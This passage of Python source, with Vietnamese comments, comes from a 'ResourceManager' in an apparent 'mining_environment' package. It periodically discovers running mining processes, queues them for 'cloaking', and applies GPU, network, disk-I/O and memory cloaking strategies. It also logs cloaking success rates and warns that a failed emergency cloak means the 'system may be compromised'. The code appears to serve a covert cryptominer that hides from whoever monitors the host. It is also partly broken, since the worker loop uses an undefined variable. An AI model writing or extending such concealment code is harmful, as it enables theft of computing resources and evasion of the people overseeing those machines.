            # **PHASE 1: Implementation completion notice** (thông báo hoàn thành triển khai)
            self.logger.info("🚀 [PHASE1-READY] Enhanced Hook Coordinator Recovery system active")
            self.logger.info("🔄 [PHASE1-READY] Fallback cloaking mode available")
            self.logger.info("🧠 [PHASE1-READY] Memory-aware safety assessment enabled")
            self.logger.info("🔧 [PHASE1-READY] Progressive recovery strategies loaded")
            
            # ✅ STARTUP VALIDATION CHECKPOINTS: Comprehensive system validation
            self._perform_startup_validation_checkpoints()
            
            # ✅ NEW: Process Discovery for existing mining processes
            self.logger.info("🔍 [PROCESS DISCOVERY] Scanning for existing mining processes...")
            self._discover_and_register_existing_processes()
            
            # **PHASE 2: Signal ResourceManager Ready** (báo hiệu ResourceManager sẵn sàng)
            self.logger.info("🎯 [PHASE 2] ResourceManager initialization completed - signaling readiness...")
            self.signal_ready()
            
            ready_time = time.time()
            total_init_time = ready_time - start_time
            self.logger.info(f"✅ [PHASE 2] ResourceManager READY - Total initialization: {total_init_time:.2f}s")
            self.logger.info("🎯 [PHASE 2] ResourceManager now accepting PID handoffs from DirectPIDRegistry")
            
            # Ultra-fast main loop với minimal monitoring
            self.logger.info("🔄 Entering minimal main monitoring loop...")
            last_discovery_time = time.time()
            last_health_check_time = time.time()
            discovery_interval = 60  # Run Process Discovery every 60 seconds
            health_check_interval = 30  # Run GPU health check every 30 seconds
            
            while not self._stop_flag:
                current_time = time.time()
                
                # Periodic Process Discovery để phát hiện mining processes mới
                if current_time - last_discovery_time >= discovery_interval:
                    self.logger.info("🔍 [PERIODIC DISCOVERY] Running periodic process discovery...")
                    self._discover_and_register_existing_processes()
                    last_discovery_time = current_time
                
                # ✅ PERIODIC GPU HEALTH CHECK: Kiểm tra sức khỏe GPU định kỳ
                if current_time - last_health_check_time >= health_check_interval:
                    self._periodic_gpu_health_check()
                    last_health_check_time = current_time
                
                time.sleep(1.0)  # Basic monitoring interval

            self.logger.info("ResourceManager main loop completed.")
        except Exception as e:
            self.logger.error(f"❌ [PHASE 2] ResourceManager startup failed: {e}\n{traceback.format_exc()}")
            # **PHASE 2: Clear ready signal on failure** (xóa tín hiệu sẵn sàng khi lỗi)
            self.clear_ready_signal()
            self.shutdown()

    def _record_strategy_metrics(self, pid: int, result_type: str, metrics_data: Dict[str, Any]) -> None:
        """
        ✅ NEW: Record strategy application metrics for monitoring and analysis.
        
        :param pid: Process ID
        :param result_type: 'success' or 'failure'
        :param metrics_data: Dictionary containing detailed metrics
        """
        try:
            import time
            timestamp = time.time()
            
            self.strategy_metrics[pid] = {
                'timestamp': timestamp,
                'result_type': result_type,
                'applied_count': metrics_data.get('applied_count', 0),
                'failed_count': metrics_data.get('failed_count', 0),
                'total_count': metrics_data.get('total_count', 0),
                'success_rate': metrics_data.get('success_rate', 0.0),
                'primary_applied': metrics_data.get('primary_applied', False),
                'strategies': metrics_data.get('strategies', [])
            }
            
            # ✅ ENHANCED: Log summary metrics for monitoring
            if result_type == 'success':
                self.logger.info(f"📈 [Metrics] PID={pid} SUCCESS: {metrics_data.get('success_rate', 0):.1f}% rate, {metrics_data.get('applied_count', 0)}/{metrics_data.get('total_count', 0)} applied")
            else:
                self.logger.warning(f"📉 [Metrics] PID={pid} FAILURE: 0% rate, {metrics_data.get('failed_count', 0)}/{metrics_data.get('total_count', 0)} failed")
                
        except Exception as e:
            self.logger.error(f"❌ Error recording strategy metrics for PID={pid}: {e}")

    def get_strategy_metrics_summary(self) -> Dict[str, Any]:
        """
        ✅ NEW: Get comprehensive strategy metrics summary for monitoring.
        
        :return: Dictionary containing aggregated metrics
        """
        try:
            if not self.strategy_metrics:
                return {'message': 'No metrics available'}
            
            total_processes = len(self.strategy_metrics)
            successful_processes = sum(1 for m in self.strategy_metrics.values() if m['result_type'] == 'success')
            failed_processes = total_processes - successful_processes
            
            avg_success_rate = sum(m['success_rate'] for m in self.strategy_metrics.values()) / total_processes
            
            return {
                'timestamp': time.time(),
                'total_processes': total_processes,
                'successful_processes': successful_processes,
                'failed_processes': failed_processes,
                'overall_success_rate': (successful_processes / total_processes) * 100,
                'avg_strategy_success_rate': avg_success_rate,
                'recent_metrics': list(self.strategy_metrics.values())[-10:]  # Last 10 entries
            }
            
        except Exception as e:
            self.logger.error(f"❌ Error generating metrics summary: {e}")
            return {'error': str(e)}

    def process_resource_adjustments(self):
        """
        ✅ OPTIMIZED: Streamlined cloaking worker với type-aware processing
        """
        self.logger.info("=== Starting optimized CloakingWorker...")
        pid = None

        while not self._stop_flag:
            try:
                # **Queue status check** (kiểm tra trạng thái hàng đợi)
                queue_size = self.resource_adjustment_queue.qsize()
                if queue_size > 0:
                    self.logger.debug(f"Processing cloaking queue, size: {queue_size}")
                
                item = self.resource_adjustment_queue.get(timeout=1)
                priority, count_val, task = item

                p = task.get('process')
                if not p:
                    self.resource_adjustment_queue.task_done()
                    self.logger.debug("Skipping task - no process object")
                    continue

                pid = p.pid
                process_type = task.get('process_type', 'GPU')
                
                self.logger.info(f"[CloakingWorker] Processing {process_type} task for PID={pid}")

                # **UNIFIED TASK PROCESSING** (xử lý task thống nhất)
                # All task types now use consistent 'type': 'cloaking' format
                if task['type'] == 'cloaking' and self.shared_resource_manager:
                    # **UNIFIED TASK PROCESSING** (xử lý task thống nhất)
                    task_action = task.get('action', 'standard_cloak')  # immediate_cloak, standard_cloak, emergency_cloak
                    coordination_status = task.get('coordination_status', False)
                    fallback_mode = task.get('fallback_mode', False)
                    task_source = task.get('source', 'unknown')
                    
                    self.logger.info(f"🎯 [UNIFIED-WORKER] Processing {task_action} task cho PID={pid} từ {task_source}")
                    self.logger.info(f"🔗 [UNIFIED-WORKER] Coordination: {coordination_status}, Fallback: {fallback_mode}")
                    
                    # **UNIFIED STRATEGY DETERMINATION** (xác định chiến lược thống nhất)
                    strategies = task.get('strategies', [])
                    if not strategies:
                        # **Auto-determine strategies based on task action** (tự động xác định chiến lược)
                        if task_action == 'emergency_cloak':
                            strategies = ['network', 'disk_io']  # Safe emergency strategies
                            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Using emergency strategies: {strategies}")
                        elif fallback_mode:
                            strategies = ['network', 'disk_io', 'cache']  # Conservative fallback
                            self.logger.info(f"🔄 [UNIFIED-FALLBACK] Using fallback strategies: {strategies}")
                        else:
                            strategies = ['gpu_cloaking', 'network', 'memory']  # Standard strategies
                            self.logger.info(f"✅ [UNIFIED-STANDARD] Using standard strategies: {strategies}")
                    
                    primary_strategy = strategies[0] if strategies else 'network'
                    additional_strategies = strategies[1:] if len(strategies) > 1 else []
                    
                    self.logger.info(f"🎯 [UNIFIED-STRATEGIES] Applying {len(strategies)} strategies cho PID={pid}")
                    self.logger.info(f"🔧 [UNIFIED-STRATEGIES] Primary: {primary_strategy}, Additional: {additional_strategies}")
                    
                    # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
                    strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                    
                    # **UNIFIED COORDINATION STATUS** (trạng thái phối hợp thống nhất)
                    coordination_verified = coordination_status  # Use task-provided coordination status
                    
                    # **Log coordination mode** (ghi log chế độ phối hợp)
                    if coordination_verified:
                        self.logger.info(f"🔒 [UNIFIED-SAFE] Hook coordination confirmed cho PID={pid} - safe to proceed")
                    elif fallback_mode:
                        self.logger.info(f"🔄 [UNIFIED-FALLBACK] Using fallback mode cho PID={pid} - conservative strategies")
                    else:
                        self.logger.info(f"ℹ️ [UNIFIED-NORMAL] Normal processing mode cho PID={pid}")
                    
                    # **Strategy processing started** (bắt đầu xử lý chiến lược)
                    self.logger.debug(f"Processing {len(strategies)} strategies for PID={pid}, coordination: {coordination_verified}")
                    
                    for strat in strategies:
                        try:
                            # **UNIFIED STRATEGY SAFETY CHECK** (kiểm tra an toàn chiến lược thống nhất)
                            strategy_safe = True
                            skip_reason = None
                            
                            # **High-risk strategy filtering** (lọc chiến lược nguy hiểm cao)
                            if strat in ['gpu_cloaking', 'memory'] and not coordination_verified:
                                if fallback_mode:
                                    # **Memory pressure check in fallback mode** (kiểm tra áp lực bộ nhớ trong chế độ fallback)
                                    memory_pressure = self.monitor_memory_pressure()
                                    if memory_pressure['pressure_level'] in ['LOW', 'MODERATE']:
                                        self.logger.info(f"🔄 [UNIFIED-FALLBACK] Strategy {strat} allowed - acceptable memory pressure")
                                    else:
                                        strategy_safe = False
                                        skip_reason = f"high_memory_pressure_{memory_pressure['pressure_level']}"
                                else:
                                    # **Non-coordinated high-risk strategy** (chiến lược nguy hiểm cao không phối hợp)
                                    strategy_safe = False
                                    skip_reason = "uncoordinated_high_risk_strategy"
                            
                            if not strategy_safe:
                                self.logger.warning(f"⚠️ [UNIFIED-SAFETY] Strategy {strat} blocked - {skip_reason}")
                                strategy_results['failed'].append(strat)
                                continue
                            
                            # **Strategy approved for execution** (chiến lược được phê duyệt thực thi)
                            self.logger.debug(f"✅ [UNIFIED-ALLOW] Strategy {strat} approved cho PID={pid}")
                            
                            # ✅ INTELLIGENT CACHING: Use advanced cache system
                            creation_start = time.time()
                            
                            # **Strategy application** (áp dụng chiến lược)
                            self.logger.debug(f"Applying strategy: {strat} for PID={pid}")
                            
                            # ✅ CACHE LOOKUP: Try to get from intelligent cache
                            s = self.shared_resource_manager.strategy_cache.get(
                                strategy_type=strat,
                                process_type=process_type,
                                strategy_hints=strategy_hints
                            )
                            
                            if s is None:
                                # ✅ CACHE MISS: Create new strategy
                                strategy_creation_start = time.time()
                                s = CloakStrategyFactory.create_strategy(
                                    strat, self.config, self.logger, 
                                    self.shared_resource_manager.resource_managers,
                                    process_type=process_type,
                                    strategy_hints=strategy_hints
                                )
                                creation_time_ms = (time.time() - strategy_creation_start) * 1000
                                
                                # ✅ CACHE STORE: Store in intelligent cache with metrics
                                cache_key = self.shared_resource_manager.strategy_cache.put(
                                    strategy_type=strat,
                                    process_type=process_type,
                                    strategy_object=s,
                                    creation_time_ms=creation_time_ms,
                                    strategy_hints=strategy_hints,
                                    metadata={
                                        'worker_id': self.worker_id,
                                        'pid': pid,
                                        'creation_timestamp': time.time()
                                    }
                                )
                                
                                self.logger.info(f"🎯 [Worker] Created strategy: {cache_key} (creation: {creation_time_ms:.1f}ms)")
                            else:
                                self.logger.debug(f"♻️ [Worker] Cache hit for strategy: {strat}_{process_type}")

                            # ✅ ENHANCED STRATEGY APPLICATION: delegate to ResourceCoordinator if plugin system required
                            from mining_environment.scripts.resource_control import ResourceCoordinator

                            apply_success = False  # default
                            if s:
                                try:
                                    if getattr(s, "requires_plugin_system", False):
                                        # Dùng ResourceCoordinator để áp dụng (bao gồm plugin delegation)
                                        rc = ResourceCoordinator(self.config, self.logger)
                                        strategy_key = getattr(s, "strategy_type", strat)
                                        apply_success = rc.apply_strategy(strategy_key, p)
                                    else:
                                        # Direct apply như cũ
                                        if hasattr(s, "apply"):
                                            apply_success = s.apply(p)
                                except Exception as _coord_err:
                                    self.logger.error(f"❌ Delegation error for strategy {strat}: {_coord_err}")
                                    apply_success = False
                                    
                                # ✅ FIX: Cập nhật strategy_results dựa trên apply_success
                                if apply_success:
                                    strategy_results['applied'].append(strat)
                                    self.logger.debug(f"Strategy {strat} applied successfully to PID={pid}")
                                else:
                                    strategy_results['failed'].append(strat)
                                    self.logger.warning(f"❌ [Strategy Failed] {strat} failed for PID={pid}")
                            else:
                                strategy_results['failed'].append(strat)
                                self.logger.warning(f"❌ [Strategy] {strat} not applicable for PID={pid}")
                                
                        except Exception as strategy_error:
                            strategy_results['failed'].append(strat)
                            # ✅ ENHANCED STRATEGY ERROR HANDLING: Track both return value failures and exceptions
                            is_primary = (strat == primary_strategy)
                            error_level = "ERROR" if is_primary else "WARNING"
                            self.logger.log(
                                logging.ERROR if is_primary else logging.WARNING,
                                f"❌ [{error_level}] Strategy '{strat}' exception for PID={pid}: {strategy_error}"
                            )
                            
                            # ✅ PRIMARY STRATEGY FAILURE: More serious, but continue with other strategies
                            if is_primary:
                                self.logger.error(f"🚨 Primary strategy '{strat}' failed - process may not be fully cloaked")

                    # ✅ ENHANCED CLOAKING STATUS: Track success/failure metrics with detailed reporting
                    applied_count = len(strategy_results['applied'])
                    failed_count = len(strategy_results['failed'])
                    primary_applied = primary_strategy in strategy_results['applied']
                    success_rate = (applied_count / strategy_results['total']) * 100 if strategy_results['total'] > 0 else 0
                    
                    if applied_count > 0:
                        self.process_states[pid] = "cloaked"
                        success_level = "FULL" if failed_count == 0 else "PARTIAL"
                        
                        # **PHASE 1: Enhanced success reporting** (báo cáo thành công nâng cao)
                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "standard")
                        self.logger.info(f"✅ [UNIFIED-SUCCESS] {success_level} {task_action} completed cho PID={pid}")
                        self.logger.info(f"🎯 [UNIFIED-STATS] Mode: {cloaking_mode}, Success: {applied_count}/{strategy_results['total']} ({success_rate:.1f}%)")
                        self.logger.info(f"📊 [UNIFIED-APPLIED] Strategies: {strategy_results['applied']}")
                        
                        # **UNIFIED METRICS TRACKING** (theo dõi metrics thống nhất)
                        self._record_strategy_metrics(pid, 'success', {
                            'applied_count': applied_count,
                            'total_count': strategy_results['total'],
                            'success_rate': success_rate,
                            'primary_applied': primary_applied,
                            'strategies': strategy_results['applied'],
                            'coordination_status': coordination_verified,
                            'fallback_mode': fallback_mode,
                            'task_action': task_action,
                            'task_source': task_source,
                            'cloaking_mode': cloaking_mode
                        })
                        
                        if failed_count > 0:
                            self.logger.warning(f"⚠️ [UNIFIED-FAILED] Failed strategies: {strategy_results['failed']}")
                            
                        # **PRIMARY STRATEGY STATUS** (trạng thái chiến lược chính)
                        if primary_applied:
                            self.logger.info(f"🎯 [UNIFIED-PRIMARY] Primary strategy '{primary_strategy}' successfully applied")
                        else:
                            if fallback_mode:
                                self.logger.info(f"🔄 [UNIFIED-PRIMARY] Primary strategy '{primary_strategy}' failed in fallback mode - expected")
                            else:
                                self.logger.warning(f"🚨 [UNIFIED-PRIMARY] Primary strategy '{primary_strategy}' failed - reduced effectiveness")
                    else:
                        # **UNIFIED COMPLETE FAILURE HANDLING** (xử lý thất bại hoàn toàn thống nhất)
                        self.process_states[pid] = "cloaking_failed"
                        cloaking_mode = "coordinated" if coordination_verified else ("fallback" if fallback_mode else "standard")
                        
                        self.logger.error(f"❌ [UNIFIED-FAILED] Complete {task_action} failure cho PID={pid}")
                        self.logger.error(f"💀 [UNIFIED-FAILED] Mode: {cloaking_mode}, Success: 0/{strategy_results['total']} (0% rate)")
                        self.logger.error(f"💀 [UNIFIED-FAILED] All strategies failed: {strategy_results['failed']}")
                        
                        # **UNIFIED FAILURE METRICS** (metrics thất bại thống nhất)
                        self._record_strategy_metrics(pid, 'failure', {
                            'failed_count': failed_count,
                            'total_count': strategy_results['total'],
                            'success_rate': 0.0,
                            'primary_applied': False,
                            'strategies': strategy_results['failed'],
                            'coordination_status': coordination_verified,
                            'fallback_mode': fallback_mode,
                            'task_action': task_action,
                            'task_source': task_source,
                            'cloaking_mode': cloaking_mode,
                            'failure_mode': 'complete_failure'
                        })
                        
                        # **FAILURE RECOVERY SUGGESTIONS** (gợi ý khôi phục thất bại)
                        if task_action == 'emergency_cloak':
                            self.logger.critical(f"🚨 [UNIFIED-CRITICAL] Emergency cloaking failed - system may be compromised cho PID={pid}")
                        elif not fallback_mode:
                            self.logger.warning(f"💡 [UNIFIED-RECOVERY] Consider emergency fallback cho PID={pid}")
                
                # ✅ CACHE METRICS: Periodic cache performance logging
                self._log_cache_metrics_if_needed()

                self.resource_adjustment_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"❌ CloakingWorker error: {e} (PID={pid})")

        self.logger.info("=== CloakingWorker stopped")

    def discover_mining_processes(self) -> List[MiningProcess]:
        """
        ✅ SIMPLIFIED: DirectPIDRegistry-driven process discovery only
        Trả về các tiến trình đã được tracked qua DirectPIDRegistry events
        """
        try:
            with self.mining_processes_lock:
                mining_processes = list(self.mining_processes)
                self.logger.info(f"✅ DirectPIDRegistry discovery: Found {len(mining_processes)} tracked processes")
                return mining_processes
                
        except Exception as e:
            self.logger.error(f"Lỗi khi truy xuất tracked processes: {e}\n{traceback.format_exc()}")
            return []

    def get_process_priority(self, process_name: str) -> int:
        """
        **Get Process Priority** (lấy độ ưu tiên tiến trình)
        
        **DEPRECATED**: GPU-only mining architecture không cần **process-based priority differentiation**.
        Tất cả GPU mining processes đều có **priority = 2** (GPU process priority).
        
        Args:
            process_name: Process name (tên tiến trình) - **ignored trong GPU-only mode**
            
        Returns:
            int: Always returns 2 (GPU process priority) cho **GPU mining processes**
        """
        # **GPU-ONLY MODE**: All mining processes are GPU processes với priority = 2
        self.logger.debug(f"🎮 [GPU-PRIORITY] Process '{process_name}' assigned GPU priority = 2 (GPU-only mode)")
        return 2

    def _initialize_gpu_monitoring(self, resource_managers: Dict[str, Any]) -> None:
        """
        **Initialize GPU Monitoring System** (khởi tạo hệ thống giám sát GPU)
        
        Args:
            resource_managers: Dictionary of resource managers từ Factory
        """
        try:
            self.logger.info("🔍 [GPU MONITOR] Starting comprehensive GPU monitoring initialization...")
            self.logger.info(f"📋 [GPU MONITOR] Resource managers available: {list(resource_managers.keys())}")
            
            # ✅ IMPORT GPU MONITOR: Import GPU monitoring system
            self.logger.info("📦 [GPU MONITOR] Importing GPU monitoring system...")
            from .gpu_resource_monitor import initialize_gpu_monitoring
            self.logger.info("✅ [GPU MONITOR] GPU monitoring system import successful")
            
            # ✅ GET GPU MANAGER: Lấy GPU manager instance
            self.logger.info("🎮 [GPU MONITOR] Retrieving GPU manager instance...")
            gpu_manager = resource_managers.get('gpu')
            if not gpu_manager:
                self.logger.error("❌ [GPU MONITOR] CRITICAL: No GPU manager found in resource_managers")
                self.logger.error(f"📋 [GPU MONITOR] Available managers: {list(resource_managers.keys())}")
                self.logger.warning("⚠️ [GPU MONITOR] Skipping monitoring initialization - no GPU manager")
                return
            
            # ✅ GPU MANAGER VALIDATION: Validate GPU manager instance
            self.logger.info("🔍 [GPU MONITOR] Validating GPU manager instance...")
            gpu_count = getattr(gpu_manager, 'get_gpu_count', lambda: 0)()
            nvml_status = getattr(gpu_manager, 'is_nvml_initialized', lambda: False)()
            self.logger.info(f"🎮 [GPU MONITOR] GPU Manager Status: GPUs={gpu_count}, NVML={nvml_status}")
            
            # ✅ MONITORING CONFIG: Cấu hình monitoring
            self.logger.info("⚙️ [GPU MONITOR] Configuring monitoring parameters...")
            monitoring_config = {
                'auto_start_monitoring': True,
                'health_check_interval_seconds': 30,
                'history_retention_hours': 24,
                'max_history_records': 1000
            }
            self.logger.info(f"📊 [GPU MONITOR] Monitoring config: {monitoring_config}")
            
            # ✅ INITIALIZE MONITOR: Khởi tạo monitor
            self.logger.info("🚀 [GPU MONITOR] Initializing GPU monitoring system...")
            self.gpu_monitor = initialize_gpu_monitoring(gpu_manager, monitoring_config)
            
            # ✅ VALIDATION: Verify monitoring initialization
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.logger.info("✅ [GPU MONITOR] GPU monitoring system initialized successfully")
                self.logger.info(f"📊 [GPU MONITOR] Health check interval: {monitoring_config['health_check_interval_seconds']}s")
                self.logger.info(f"🔍 [GPU MONITOR] Auto-start monitoring: {monitoring_config['auto_start_monitoring']}")
                
                # ✅ ACTIVATION STATUS: Check if monitoring is active
                is_monitoring = getattr(self.gpu_monitor, 'is_monitoring', False)
                self.logger.info(f"📡 [GPU MONITOR] Monitoring active status: {is_monitoring}")
                
                if is_monitoring:
                    self.logger.info("🎯 [GPU MONITOR] MONITORING ACTIVATION SUCCESS - GPU monitoring is now active")
                else:
                    self.logger.warning("⚠️ [GPU MONITOR] MONITORING NOT ACTIVE - Manual activation may be required")
            else:
                self.logger.error("❌ [GPU MONITOR] CRITICAL: Monitor initialization failed - gpu_monitor is None")
            
        except ImportError as e:
            self.logger.error(f"❌ [GPU MONITOR] Could not import GPU monitoring system: {e}")
            self.logger.error("💡 [GPU MONITOR] Check if gpu_resource_monitor.py exists and is accessible")
        except Exception as e:
            self.logger.error(f"❌ [GPU MONITOR] Failed to initialize GPU monitoring: {e}")
            self.logger.error(f"🔍 [GPU MONITOR] Exception details: {type(e).__name__}: {str(e)}")
            import traceback
            self.logger.error(f"📋 [GPU MONITOR] Full traceback: {traceback.format_exc()}")

    def _periodic_gpu_health_check(self) -> None:
        """
        **Periodic GPU Health Check** (kiểm tra sức khỏe GPU định kỳ)
        
        Được gọi trong main monitoring loop để thực hiện health checks
        """
        try:
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                # ✅ PERFORM HEALTH CHECK: Thực hiện health check
                health_metrics = self.gpu_monitor.perform_health_check()
                
                # ✅ LOG CRITICAL ISSUES: Log các vấn đề nghiêm trọng
                if not health_metrics.manager_active:
                    self.logger.error("🚨 [GPU HEALTH] CRITICAL: GPU Manager is not active!")
                elif not health_metrics.nvml_initialized:
                    self.logger.warning("⚠️ [GPU HEALTH] WARNING: NVML is not initialized")
                elif health_metrics.temperature_celsius > 80:
                    self.logger.warning(f"🌡️ [GPU HEALTH] WARNING: High temperature: {health_metrics.temperature_celsius}°C")
                elif health_metrics.cloaking_success_rate < 90:
                    self.logger.warning(f"📉 [GPU HEALTH] WARNING: Low success rate: {health_metrics.cloaking_success_rate:.1f}%")
                else:
                    # ✅ PERIODIC SUCCESS LOG: Log thành công định kỳ (mỗi 10 lần)
                    if self.gpu_monitor.manager_status.total_operations % 10 == 0:
                        self.logger.info(f"✅ [GPU HEALTH] All systems healthy - {health_metrics.processes_cloaked} processes cloaked")
                
        except Exception as e:
            self.logger.error(f"❌ [GPU HEALTH] Health check failed: {e}")

    def _perform_startup_validation_checkpoints(self) -> None:
        """
        **Perform Startup Validation Checkpoints** (thực hiện các checkpoint xác thực khởi động)
        
        Comprehensive validation để đảm bảo tất cả systems hoạt động correctly
        """
        try:
            self.logger.info("🔍 [STARTUP VALIDATION] Starting comprehensive startup validation checkpoints...")
            
            # ✅ CHECKPOINT 1: Factory Registration Verification
            self.logger.info("1️⃣ [CHECKPOINT] Factory registration verification...")
            try:
                from .resource_control import ResourceControlFactory
                sharing_info = ResourceControlFactory.get_shared_managers_info()
                total_configs = sharing_info.get('total_configs', 0)
                managers_per_config = sharing_info.get('managers_per_config', {})
                
                self.logger.info(f"✅ [FACTORY CHECKPOINT] Factory configs: {total_configs}")
                self.logger.info(f"📋 [FACTORY CHECKPOINT] Managers per config: {managers_per_config}")
                
                # ✅ VERIFY GPU MANAGER REGISTRATION
                gpu_manager_found = False
                for config_hash, managers in managers_per_config.items():
                    if 'gpu' in managers:
                        gpu_manager_found = True
                        self.logger.info(f"✅ [FACTORY CHECKPOINT] GPU manager registered in config {config_hash}")
                        break
                
                if not gpu_manager_found:
                    self.logger.error("❌ [FACTORY CHECKPOINT] CRITICAL: No GPU manager found in any factory config")
                else:
                    self.logger.info("✅ [FACTORY CHECKPOINT] GPU manager registration verified successfully")
                    
            except Exception as factory_err:
                self.logger.error(f"❌ [FACTORY CHECKPOINT] Factory verification failed: {factory_err}")
            
            # ✅ CHECKPOINT 2: Shared Resource Manager Verification
            self.logger.info("2️⃣ [CHECKPOINT] Shared resource manager verification...")
            if self.shared_resource_manager:
                if hasattr(self.shared_resource_manager, 'resource_managers'):
                    available_managers = list(self.shared_resource_manager.resource_managers.keys())
                    self.logger.info(f"✅ [SHARED CHECKPOINT] Available managers: {available_managers}")
                    
                    if 'gpu' in available_managers:
                        self.logger.info("✅ [SHARED CHECKPOINT] GPU manager accessible via shared manager")
                    else:
                        self.logger.error("❌ [SHARED CHECKPOINT] GPU manager NOT accessible via shared manager")
                else:
                    self.logger.warning("⚠️ [SHARED CHECKPOINT] Shared manager missing resource_managers attribute")
            else:
                self.logger.error("❌ [SHARED CHECKPOINT] CRITICAL: No shared resource manager instance")
            
            # ✅ CHECKPOINT 3: GPU Monitoring System Verification
            self.logger.info("3️⃣ [CHECKPOINT] GPU monitoring system verification...")
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.logger.info("✅ [MONITOR CHECKPOINT] GPU monitor instance exists")
                
                # ✅ CHECK MONITORING STATUS
                is_monitoring = getattr(self.gpu_monitor, 'is_monitoring', False)
                has_gpu_manager = getattr(self.gpu_monitor, 'gpu_manager', None) is not None
                
                self.logger.info(f"📡 [MONITOR CHECKPOINT] Monitoring active: {is_monitoring}")
                self.logger.info(f"🎮 [MONITOR CHECKPOINT] GPU manager attached: {has_gpu_manager}")
                
                if is_monitoring and has_gpu_manager:
                    self.logger.info("🎯 [MONITOR CHECKPOINT] ✅ MONITORING FULLY OPERATIONAL")
                elif has_gpu_manager and not is_monitoring:
                    self.logger.warning("⚠️ [MONITOR CHECKPOINT] GPU manager attached but monitoring not active")
                else:
                    self.logger.error("❌ [MONITOR CHECKPOINT] CRITICAL: GPU monitoring not properly configured")
            else:
                self.logger.error("❌ [MONITOR CHECKPOINT] CRITICAL: No GPU monitor instance found")
                self.logger.error("💡 [MONITOR CHECKPOINT] GPU monitoring system was not initialized properly")
            
            # ✅ CHECKPOINT 4: GPU Manager Direct Access Test
            self.logger.info("4️⃣ [CHECKPOINT] GPU manager direct access test...")
            if self.shared_resource_manager and hasattr(self.shared_resource_manager, 'resource_managers'):
                gpu_manager = self.shared_resource_manager.resource_managers.get('gpu')
                if gpu_manager:
                    try:
                        gpu_count = gpu_manager.get_gpu_count()
                        nvml_status = gpu_manager.is_nvml_initialized()
                        self.logger.info(f"✅ [GPU ACCESS CHECKPOINT] Direct GPU access: GPUs={gpu_count}, NVML={nvml_status}")
                    except Exception as gpu_access_err:
                        self.logger.error(f"❌ [GPU ACCESS CHECKPOINT] GPU manager access failed: {gpu_access_err}")
                else:
                    self.logger.error("❌ [GPU ACCESS CHECKPOINT] GPU manager not accessible")
            
            # ✅ FINAL VALIDATION SUMMARY
            self.logger.info("🏁 [STARTUP VALIDATION] Startup validation checkpoints completed")
            
        except Exception as e:
            self.logger.error(f"❌ [STARTUP VALIDATION] Startup validation failed: {e}")
            import traceback
            self.logger.error(f"📋 [STARTUP VALIDATION] Validation traceback: {traceback.format_exc()}")

    def register_process_for_monitoring(self, pid: int, process_info: Dict[str, Any]) -> None:
        """
        **Register Process for GPU Monitoring** (đăng ký tiến trình cho giám sát GPU)
        
        Args:
            pid: Process ID
            process_info: Thông tin tiến trình
        """
        try:
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.gpu_monitor.register_cloaked_process(pid, process_info)
                self.logger.info(f"📋 [GPU MONITOR] Process PID={pid} registered for monitoring")
        except Exception as e:
            self.logger.error(f"❌ [GPU MONITOR] Failed to register process PID={pid}: {e}")

    def unregister_process_from_monitoring(self, pid: int) -> None:
        """
        **Unregister Process from GPU Monitoring** (hủy đăng ký tiến trình khỏi giám sát GPU)
        
        Args:
            pid: Process ID
        """
        try:
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.gpu_monitor.unregister_cloaked_process(pid)
                self.logger.info(f"🗑️ [GPU MONITOR] Process PID={pid} unregistered from monitoring")
        except Exception as e:
            self.logger.error(f"❌ [GPU MONITOR] Failed to unregister process PID={pid}: {e}")

    # ===== PROGRESSIVE MEMORY ALLOCATION SYSTEM =====
    
    def allocate_memory_progressive(self, required_mb: int) -> Dict[str, Any]:
        """
        **Progressive Memory Allocation** (cấp phát bộ nhớ tiến tiến)
        
        Allocate memory progressively with safety checks based on current memory pressure.
        This prevents memory exhaustion that leads to std::bad_alloc.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu tính bằng MB)
            
        Returns:
            Dict with allocation result: {
                'success': bool,
                'allocated_mb': int,
                'strategy': str,
                'memory_pressure': float,
                'safety_action': str
            }
        """
        try:
            # **Get current memory pressure** (lấy áp lực bộ nhớ hiện tại)
            memory_info = psutil.virtual_memory()
            current_usage = memory_info.percent
            available_mb = memory_info.available / (1024 * 1024)
            
            self.logger.info(f"🔍 [PROGRESSIVE ALLOCATION] Request: {required_mb}MB, Current usage: {current_usage:.1f}%")
            
            # **Critical threshold check** (kiểm tra ngưỡng quan trọng)
            if current_usage > 85:
                self.logger.warning(f"🚨 [MEMORY PRESSURE] Critical threshold exceeded: {current_usage:.1f}% > 85%")
                return self.reduce_memory_footprint(required_mb)
            
            # **Conservative allocation zone** (vùng cấp phát thận trọng)
            elif current_usage > 75:
                self.logger.warning(f"⚠️ [MEMORY PRESSURE] Conservative zone: {current_usage:.1f}% > 75%")
                return self.allocate_conservative(required_mb)
            
            # **Normal allocation zone** (vùng cấp phát bình thường)
            else:
                self.logger.info(f"✅ [MEMORY PRESSURE] Normal zone: {current_usage:.1f}% ≤ 75%")
                return self.allocate_normal(required_mb)
                
        except Exception as e:
            self.logger.error(f"❌ [PROGRESSIVE ALLOCATION] Error during progressive allocation: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'error',
                'memory_pressure': 0.0,
                'safety_action': f'allocation_failed: {e}'
            }
    
    def reduce_memory_footprint(self, required_mb: int) -> Dict[str, Any]:
        """
        **Reduce Memory Footprint** (giảm dung lượng bộ nhớ)
        
        Emergency memory management when system pressure > 85%.
        Attempts to free memory before allocation.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu)
            
        Returns:
            Dict with reduction result (từ điển với kết quả giảm)
        """
        try:
            memory_before = psutil.virtual_memory()
            self.logger.warning(f"🚨 [MEMORY REDUCTION] Emergency mode activated: {memory_before.percent:.1f}%")
            
            # **Step 1: Drop system caches** (bước 1: xóa cache hệ thống)
            if hasattr(self.shared_resource_manager, 'resource_managers'):
                cache_manager = self.shared_resource_manager.resource_managers.get('cache')
                if cache_manager and hasattr(cache_manager, 'drop_caches'):
                    cache_dropped = cache_manager.drop_caches()
                    if cache_dropped:
